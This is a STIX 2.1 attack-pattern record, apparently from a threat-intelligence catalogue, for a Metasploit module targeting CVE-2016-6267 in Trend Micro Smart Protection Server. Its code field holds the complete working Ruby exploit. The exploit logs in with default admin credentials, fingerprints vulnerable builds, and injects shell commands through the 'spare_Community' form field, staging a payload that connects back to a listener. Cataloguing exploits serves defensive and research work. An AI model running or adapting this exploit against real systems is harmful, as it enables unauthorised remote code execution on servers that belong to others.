{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d11c92b-ec9d-4648-9675-299924ca040e",
    "created": "2024-08-14T17:02:10.149681Z",
    "modified": "2024-08-14T17:02:10.149686Z",
    "name": "\"Trend Micro Smart Protection Server Exec Remote Code Injection\"",
    "description": " This module exploits a vulnerability found in TrendMicro Smart Protection Server where untrusted inputs are fed to ServWebExec system command, leading to command injection. Please note: authentication is required to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/trendmicro_sps_exec.rb",
            "external_id": "trendmicro_sps_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6267"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\nrequire 'base64'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Trend Micro Smart Protection Server Exec Remote Code Injection\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in TrendMicro Smart Protection Server where untrusted inputs are fed to ServWebExec system command, leading to command injection.\n        Please note: authentication is required to exploit this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Quentin Kaiser <kaiserquentin[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2016-6267']\n        ],\n      'Platform'        => 'linux',\n      'Targets'         => [ [ 'Linux', {} ] ],\n      'Payload'         => { 'BadChars' => \"\\x00\" },\n      'CmdStagerFlavor' => [ 'bourne' ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n      {\n         'SSL' => true\n      },\n      'DisclosureDate' => '2016-08-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('SSL', [ true, 'Use SSL', true ]),\n        OptString.new('TARGETURI', [true, 'The base path', '/']),\n        OptAddress.new(\"LHOST\", [true, \"The local host for the exploits and handlers\", Rex::Socket.source_address]),\n        OptPort.new('LPORT', [true, \"The port SPS will connect back to \", 4444 ]),\n        OptString.new('ADMINACCOUNT', [true, 'Name of the SPS admin account', 'admin']),\n        OptString.new('ADMINPASS', [true, 'Password of the SPS admin account', 'admin']),\n      ])\n  end\n\n\n  def check\n    opts = login\n    if opts\n      uri = target_uri.path\n      res = send_request_cgi({\n        'method'   => 'GET',\n        'uri'      => normalize_uri(uri, \"php/about.php?sid=#{opts['sid']}\"),\n        'headers'=>\n        {\n          'Cookie' => \"#{opts[\"sid\"]}=#{opts[\"sid_value\"]}\",\n          'Referer' => \"https://#{datastore['RHOST']}:#{datastore['RPORT']}/login.php\",\n          'Origin' =>  \"https://#{datastore['RHOST']}:#{datastore['RPORT']}\",\n        }\n      })\n      if res and res.code == 200\n        version = res.body.to_s.scan(/MSG_ABOUT_VERSION <\\/td>[^<]*<td[^>]*>([^<]*)</).last.first.to_f\n        build = res.body.to_s.scan(/MSG_ABOUT_BUILD <\\/td>[^<]*<td[^>]*><span[^>]*>([^<]*)</).last.first.to_i(10)\n        print_status(\"TrendMicro Smart Protection Server detected.\")\n        print_status(\"Version: #{version}\")\n        print_status(\"Build: #{build}\")\n        if (version == 3.0 and build < 1330) or\n          (version == 2.6 and build < 2106) or\n          (version == 2.5 and build < 2200)\n            return Exploit::CheckCode::Vulnerable\n        else\n          return Exploit::CheckCode::Safe\n        end\n      end\n    end\n    Exploit::CheckCode::Unknown\n  end\n\n\n  def execute_command(cmd, opts = {})\n    uri = target_uri.path\n    send_request_cgi({\n      'method' => 'POST',\n      'version' => '1.0',\n      'timeout' => 1,\n      'uri' => normalize_uri(uri, 'php/admin_notification.php'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'headers'=>\n      {\n        'Cookie' => \"#{opts[\"sid\"]}=#{opts[\"sid_value\"]}\",\n        'Referer' => \"https://#{datastore['RHOST']}:#{datastore['RPORT']}/login.php\",\n        'Origin' =>  \"https://#{datastore['RHOST']}:#{datastore['RPORT']}\",\n      },\n      'vars_post' => {\n        'EnableSNMP' => 'on',\n        'Community' => 'hello',\n        'submit' => 'Save',\n        'pubkey' => '',\n        'spare_EnableSNMP' => 1,\n        'spare_Community' => \"test;#{cmd}\",\n        'spare_EnableIPRestriction' => 0,\n        'spare_AllowGroupIP' => '',\n        'spare_AllowGroupNetmask' => '',\n        'sid' => opts[\"sid\"]\n      }\n    })\n  end\n\n  def login\n    uri = target_uri.path\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'index.php'),\n    })\n    if res and res.code == 200 and !res.get_cookies.empty?\n      sid = res.get_cookies.scan(/([^=]*)=[^;]*;/).last.first.strip\n      sid_value = res.get_cookies.scan(/#{sid}=([a-z0-9]+);/).last.first\n      n = res.body.to_s.scan(/name=\"pubkey\" value=\"([^\"]*)\"/).last.first\n      nonce = res.body.to_s.scan(/name=\"nonce\" value=\"([^\"]*)\"/).last.first\n      asn1_sequence = OpenSSL::ASN1::Sequence.new(\n        [\n          OpenSSL::ASN1::Integer.new(\"0x#{n}\".to_i(16)),\n          OpenSSL::ASN1::Integer.new(\"0x10001\".to_i(16))\n        ]\n      )\n      public_key = OpenSSL::PKey::RSA.new(asn1_sequence)\n      creds = \"#{datastore['ADMINACCOUNT']}\\t#{datastore['ADMINPASS']}\\t#{nonce}\"\n      data = Base64.encode64(public_key.public_encrypt(creds))\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(uri, \"auth.php\"),\n        'ctype' => 'application/x-www-form-urlencoded',\n        'headers'=>\n        {\n          'Cookie' => \"#{sid}=#{sid_value}\",\n          'Referer' => \"https://#{datastore['RHOST']}:#{datastore['RPORT']}/login.php\",\n          'Origin' =>  \"https://#{datastore['RHOST']}:#{datastore['RPORT']}\",\n        },\n        'vars_post' => {\n          'data' => data,\n          'sid' => sid\n        }\n      })\n      if res and res.code == 302\n        if res.headers.key?('Set-Cookie')\n          sid = res.get_cookies.scan(/([^=]*)=[^;]*;/).last.first\n          sid_value = res.get_cookies.scan(/#{sid}=([^;]*);/).last.first\n        end\n        store_valid_credential(user: datastore['ADMINACCOUNT'], private: datastore['ADMINPASS'], proof: \"#{sid}=#{sid_value}\")\n        return {\"sid\" => sid, \"sid_value\" => sid_value}\n      end\n    end\n    nil\n  end\n\n  def exploit\n    opts = login\n    if opts\n      print_good(\"Successfully logged in\")\n      print_status(\"Exploiting...\")\n      execute_cmdstager(opts=opts)\n    else\n      print_error(\"An error occurred while logged in\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-08-08",
    "x_mitre_platforms": [
        "linux'"
    ]
}